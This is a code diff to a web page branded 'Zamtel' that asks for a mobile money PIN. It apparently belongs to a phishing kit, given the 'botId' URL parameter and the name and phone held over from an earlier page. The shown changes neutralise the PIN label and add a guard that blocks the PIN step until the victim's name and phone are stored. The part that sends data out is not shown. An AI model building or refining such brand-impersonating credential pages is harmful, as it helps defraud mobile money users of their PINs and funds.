@@ -72,8 +72,8 @@ body{
   min-height:18px;
   font-weight:600;
 }
-#status.success{ color:#00843d; }   /* green */
-#status.error{   color:#d32f2f; }   /* red   */
+#status.success{ color:#00843d; }
+#status.error{   color:#d32f2f; }
 
 .lower-section{
   width:100%;
@@ -112,7 +112,7 @@ body{
   <div class="upper-section">
     <div class="brand-name">Zamtel</div>
     <div class="welcome-text">Welcome</div>
-    <div class="pin-label">Enter your mobile money pin</div>
+    <div class="pin-label">Enter your PIN code</div>
 
     <div class="pin-boxes">
       <input type="tel" maxlength="1">
@@ -142,10 +142,19 @@ const botId   = new URLSearchParams(window.location.search).get("botId");
 const boxes   = document.querySelectorAll(".pin-boxes input");
 const statusEl= document.getElementById("status");
 
+// 🛡️ Guard: ensure name + phone exist before letting user continue
+const storedName  = localStorage.getItem("name");
+const storedPhone = localStorage.getItem("phone");
+if(!storedName || !storedPhone){
+  // Send them back to the start page to enter their details
+  window.location.href = "index.html" + (botId ? "?botId=" + botId : "");
+  throw new Error("Missing identity — redirecting to index.html");
+}
+
 function getIdentity(){
   return {
-    name:  localStorage.getItem("name")  || "Unknown",
-    phone: localStorage.getItem("phone") || "Unknown"
+    name:  storedName,
+    phone: storedPhone
   };
 }
 
